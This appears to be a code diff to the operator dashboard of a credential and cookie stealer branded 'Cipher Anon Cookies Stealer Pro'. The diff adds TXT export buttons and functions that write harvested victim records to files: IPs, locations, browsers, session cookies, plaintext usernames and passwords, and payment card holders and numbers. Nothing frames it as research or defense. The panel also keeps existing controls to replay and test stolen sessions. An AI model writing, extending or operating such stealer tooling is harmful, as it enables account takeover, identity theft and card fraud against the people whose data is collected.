@@ -443,6 +443,8 @@
         .btn-icon-sm.eye:hover { background: rgba(59,130,246,0.08); }
         .btn-icon-sm.delete-sm { border-color: #ff4444; color: #ff4444; }
         .btn-icon-sm.delete-sm:hover { background: rgba(255,68,68,0.15); }
+        .btn-icon-sm.txt { border-color: #8b5cf6; color: #8b5cf6; }
+        .btn-icon-sm.txt:hover { background: rgba(139,92,246,0.08); }
 
         .domain-grid {
             display: grid;
@@ -590,6 +592,8 @@
         .domain-card .actions .btn-sm.download:hover { background: rgba(245,158,11,0.08); }
         .domain-card .actions .btn-sm.delete { border-color: #ff4444; color: #ff4444; }
         .domain-card .actions .btn-sm.delete:hover { background: rgba(255,68,68,0.15); }
+        .domain-card .actions .btn-sm.txt { border-color: #8b5cf6; color: #8b5cf6; }
+        .domain-card .actions .btn-sm.txt:hover { background: rgba(139,92,246,0.08); }
 
         .view-content { display: none; }
         .view-content.active { display: block; }
@@ -727,7 +731,7 @@
             gap: 8px;
             margin-bottom: 4px;
             flex-wrap: wrap;
-            padding-right: 70px;
+            padding-right: 120px;
         }
         .modal .victim-entry .victim-header .flag { font-size: 18px; }
         .modal .victim-entry .victim-header .ip { font-family: monospace; font-size: 12px; color: #e2e8f0; font-weight: 600; }
@@ -754,10 +758,12 @@
             right: 8px;
             display: flex;
             gap: 4px;
+            flex-wrap: wrap;
+            max-width: 110px;
         }
         .modal .victim-entry .modal-actions .btn-icon-sm {
             padding: 0 6px;
-            font-size: 12px;
+            font-size: 11px;
             line-height: 22px;
             height: 24px;
         }
@@ -774,6 +780,13 @@
         }
         .modal .victim-entry .modal-actions .btn-icon-sm.restore-sm:hover {
             background: rgba(0,255,136,0.08);
+        }
+        .modal .victim-entry .modal-actions .btn-icon-sm.txt {
+            border-color: #8b5cf6;
+            color: #8b5cf6;
+        }
+        .modal .victim-entry .modal-actions .btn-icon-sm.txt:hover {
+            background: rgba(139,92,246,0.08);
         }
 
         .modal .victim-entry .data-section {
@@ -1032,6 +1045,8 @@
             .modal .victim-entry .data-section .data-item .label { min-width: 40px; }
             .modal .victim-entry .data-section .data-item .actions { margin-top: 2px; }
             .modal .victim-entry .victim-header { padding-right: 50px; }
+            .modal .victim-entry .modal-actions { top: 4px; right: 4px; max-width: 80px; }
+            .modal .victim-entry .modal-actions .btn-icon-sm { font-size: 9px; padding: 0 4px; height: 20px; line-height: 20px; }
         }
         @media (max-width: 480px) {
             .stats-row { grid-template-columns: 1fr; }
@@ -1057,7 +1072,8 @@
             .sidebar .contact-support { font-size: 10px; padding: 4px 10px; }
             .modal .session-actions .btn { font-size: 10px; padding: 4px 10px; }
             .btn-icon-sm { font-size: 8px; padding: 0 4px; height: 18px; line-height: 18px; }
-            .modal .victim-entry .modal-actions .btn-icon-sm { font-size: 10px; height: 20px; line-height: 20px; }
+            .modal .victim-entry .modal-actions .btn-icon-sm { font-size: 9px; height: 18px; line-height: 18px; }
+            .modal .victim-entry .modal-actions { max-width: 70px; }
         }
         @media (max-width: 360px) {
             .main { padding: 10px; padding-top: 48px; }
@@ -1067,6 +1083,8 @@
             .topbar .page-title h2 { font-size: 15px; }
             .modal .victim-entry .data-section .data-item .value { min-width: 40px; font-size: 8px; }
             .modal .victim-entry .data-section .data-item .label { font-size: 8px; min-width: 30px; }
+            .modal .victim-entry .modal-actions { max-width: 60px; }
+            .modal .victim-entry .modal-actions .btn-icon-sm { font-size: 8px; padding: 0 3px; height: 16px; line-height: 16px; }
         }
     </style>
 </head>
@@ -1198,6 +1216,7 @@
                 <div class="left">
                     <button class="btn primary" onclick="downloadJSON()">📥 JSON</button>
                     <button class="btn warning" onclick="downloadNetscape()">📥 Netscape</button>
+                    <button class="btn" onclick="downloadTxt()" style="border-color:#8b5cf6;color:#8b5cf6;">📥 TXT</button>
                 </div>
                 <div class="right">
                     <button class="btn danger" onclick="showClearAllConfirm()">🗑️ Clear</button>
@@ -1322,7 +1341,7 @@
             </div>
         </div>
 
-        <!-- VIEW: EXPORT DATA -->
+        <!-- VIEW: EXPORT DATA — ADDED TXT -->
         <div class="view-content" id="viewExport">
             <div class="toolbar" style="margin-bottom:12px;">
                 <div class="left"><span style="color:#64748b;font-size:12px;">Export formats</span></div>
@@ -1349,6 +1368,11 @@
                     <div style="font-weight:600;color:#f1f5f9;font-size:13px;">Raw JSON</div>
                     <button class="btn" onclick="exportRawJSON()" style="width:100%;justify-content:center;margin-top:6px;font-size:10px;border-color:#f59e0b;color:#f59e0b;">Download</button>
                 </div>
+                <div style="background:#0f1626;border:1px solid #1a2538;border-radius:10px;padding:14px;text-align:center;">
+                    <div style="font-size:28px;margin-bottom:4px;">📝</div>
+                    <div style="font-weight:600;color:#f1f5f9;font-size:13px;">TXT</div>
+                    <button class="btn" onclick="downloadTxt()" style="width:100%;justify-content:center;margin-top:6px;font-size:10px;border-color:#8b5cf6;color:#8b5cf6;">Download</button>
+                </div>
             </div>
         </div>
 
@@ -1366,6 +1390,7 @@
             <div class="session-actions">
                 <button class="btn primary" onclick="replayFromModal()">▶️ Replay</button>
                 <button class="btn test" style="border-color:#3b82f6;color:#3b82f6;" onclick="testFromModal()">🔍 Test</button>
+                <button class="btn" onclick="downloadModalTxt()" style="border-color:#8b5cf6;color:#8b5cf6;">📥 TXT</button>
             </div>
             <div class="test-result" id="testResultModal"></div>
         </div>
@@ -1447,7 +1472,7 @@
     <div class="toast" id="toast"></div>
 
     <!-- ============================================================
-    DASHBOARD LOGIC — ALL FEATURES + DELETE BUTTON
+    DASHBOARD LOGIC — ALL FEATURES + TXT EXPORT
     ============================================================ -->
     <script>
         // ============================================================
@@ -1799,6 +1824,7 @@
                         <span>
                             ${stats.entries.length} total
                             <button class="delete-domain-btn" onclick="event.stopPropagation(); showDeleteDomainConfirm('${domain}')">🗑️</button>
+                            <button class="delete-domain-btn" onclick="event.stopPropagation(); downloadDomainTxt('${domain}')" style="border-color:#8b5cf6;color:#8b5cf6;margin-left:4px;">📝</button>
                         </span>
                     </div>
                     <div class="actions">
@@ -1806,6 +1832,7 @@
                         <button class="btn-sm test" onclick="event.stopPropagation(); testSession('${domain}')">🔍</button>
                         <button class="btn-sm download" onclick="event.stopPropagation(); downloadDomain('${domain}')">📥</button>
                         <button class="btn-sm delete" onclick="event.stopPropagation(); showDeleteDomainConfirm('${domain}')">🗑️</button>
+                        <button class="btn-sm txt" onclick="event.stopPropagation(); downloadDomainTxt('${domain}')">📝</button>
                     </div>
                 `;
                 card.onclick = () => openModal(domain, stats, 'main');
@@ -2179,7 +2206,176 @@
         }
 
         // ============================================================
-        // MODAL — WITH DELETE BUTTON
+        // TXT EXPORT FUNCTIONS
+        // ============================================================
+
+        function formatTxt(data, title) {
+            const lines = [];
+            const sep = '='.repeat(60);
+            const now = new Date().toISOString();
+
+            lines.push(sep);
+            lines.push(`  ${title || 'CIPHER ANON — STOLEN DATA'}`);
+            lines.push(`  Exported: ${now}`);
+            lines.push(sep);
+            lines.push('');
+
+            if (!data || data.length === 0) {
+                lines.push('No data to export.');
+                return lines.join('\n');
+            }
+
+            let totalCookies = 0;
+            let totalCreds = 0;
+            let totalCards = 0;
+
+            data.forEach((entry, idx) => {
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                const ip = entry.ip || 'Unknown';
+                const country = entry.country || 'Unknown';
+                const city = entry.city || 'N/A';
+                const time = entry.receivedAt ? formatFullTime(entry.receivedAt) : 'Unknown';
+                const browser = entry.browser || entry.fingerprint?.browser || 'Unknown';
+                const cookies = entry.cookies || {};
+                const creds = entry.credentials || [];
+                const cards = entry.cards || [];
+
+                const cookieCount = Object.keys(cookies).length;
+                const credCount = creds.length;
+                const cardCount = cards.length;
+                totalCookies += cookieCount;
+                totalCreds += credCount;
+                totalCards += cardCount;
+
+                lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+                lines.push(`  VICTIM #${idx + 1}`);
+                lines.push(`  Domain:   ${domain}`);
+                lines.push(`  IP:       ${ip}`);
+                lines.push(`  Country:  ${country} (${city})`);
+                lines.push(`  Browser:  ${browser}`);
+                lines.push(`  Time:     ${time}`);
+                lines.push(`  Cookies:  ${cookieCount}`);
+                lines.push(`  Creds:    ${credCount}`);
+                lines.push(`  Cards:    ${cardCount}`);
+                lines.push('');
+
+                // Cookies
+                if (cookieCount > 0) {
+                    lines.push(`  ─── COOKIES (${cookieCount}) ───`);
+                    Object.entries(cookies).forEach(([name, value]) => {
+                        const v = value.length > 60 ? value.slice(0, 60) + '...' : value;
+                        lines.push(`    ${name} = ${v}`);
+                    });
+                    lines.push('');
+                }
+
+                // Credentials
+                if (credCount > 0) {
+                    lines.push(`  ─── CREDENTIALS (${credCount}) ───`);
+                    creds.forEach(c => {
+                        const name = c.name || c.username || 'unknown';
+                        const value = c.value || c.password || '';
+                        const url = c.url || c.origin_url || domain;
+                        lines.push(`    Username: ${name}`);
+                        lines.push(`    Password: ${value}`);
+                        lines.push(`    URL:      https://${url}`);
+                        lines.push('');
+                    });
+                }
+
+                // Cards
+                if (cardCount > 0) {
+                    lines.push(`  ─── CARDS (${cardCount}) ───`);
+                    cards.forEach(c => {
+                        let value = c.value || c.number || c.card_number || '';
+                        const name = c.name || c.cardholder || 'Unknown';
+                        if (c.month && c.year && !value.includes('/')) {
+                            value = c.month + '/' + c.year;
+                        }
+                        lines.push(`    Cardholder: ${name}`);
+                        lines.push(`    Number:     ${value}`);
+                        lines.push(`    URL:        https://${c.url || domain}`);
+                        lines.push('');
+                    });
+                }
+
+                lines.push('');
+            });
+
+            lines.push(sep);
+            lines.push(`  SUMMARY`);
+            lines.push(sep);
+            lines.push(`  Total Victims:  ${data.length}`);
+            lines.push(`  Total Cookies:  ${totalCookies}`);
+            lines.push(`  Total Creds:    ${totalCreds}`);
+            lines.push(`  Total Cards:    ${totalCards}`);
+            lines.push(sep);
+            lines.push(`  Exported by Cipher Anon Cookies Stealer Pro`);
+            lines.push(sep);
+
+            return lines.join('\n');
+        }
+
+        function downloadTxt() {
+            if (allData.length === 0) {
+                showToast('❌ No data to export', 'error');
+                return;
+            }
+            const content = formatTxt(allData, 'CIPHER ANON — ALL STOLEN DATA');
+            const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cipher_anon_export_${new Date().toISOString().slice(0,10)}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast('📥 TXT exported', 'success');
+        }
+
+        function downloadModalTxt() {
+            if (!currentModalEntry) {
+                showToast('❌ No victim loaded', 'error');
+                return;
+            }
+            const content = formatTxt([currentModalEntry], `VICTIM — ${currentModalDomain}`);
+            const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `victim_${currentModalDomain}_${new Date().toISOString().slice(0,10)}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast('📥 Victim TXT exported', 'success');
+        }
+
+        function downloadDomainTxt(domain) {
+            const entries = allData.filter(e => {
+                const d = e.fingerprint?.hostname || e.domain || 'unknown';
+                return d === domain;
+            });
+            if (entries.length === 0) {
+                showToast('❌ No victims for this domain', 'error');
+                return;
+            }
+            const content = formatTxt(entries, `DOMAIN — ${domain} (${entries.length} victims)`);
+            const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `domain_${domain}_${new Date().toISOString().slice(0,10)}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast(`📥 Domain TXT exported (${entries.length} victims)`, 'success');
+        }
+
+        // ============================================================
+        // MODAL — WITH DELETE BUTTON + TXT
         // ============================================================
 
         function openModalForEntry(uniqueId) {
@@ -2232,11 +2428,14 @@
                 `<button class="btn-icon-sm restore-sm" onclick="showRestoreConfirm('${entry._uniqueId}', '${currentModalDomain}')">↩️</button>` :
                 '';
 
+            const txtBtn = `<button class="btn-icon-sm txt" onclick="downloadModalTxt()">📝</button>`;
+
             let html = `
                 <div class="victim-entry">
                     <div class="modal-actions">
                         ${restoreBtn}
                         ${deleteBtn}
+                        ${txtBtn}
                     </div>
                     <div class="victim-header">
                         <span class="flag">${flag}</span>
@@ -2358,7 +2557,6 @@
         // ============================================================
 
         function showDeleteDomainConfirm(domain) {
-            // Count how many victims in this domain
             const count = allData.filter(e => {
                 const d = e.fingerprint?.hostname || e.domain || 'unknown';
                 return d === domain;
@@ -2840,7 +3038,7 @@
         }
 
         // ============================================================
-        // DELETE FUNCTIONS (full implementation)
+        // DELETE FUNCTIONS
         // ============================================================
 
         function showDeleteConfirm(uniqueId, domain) {
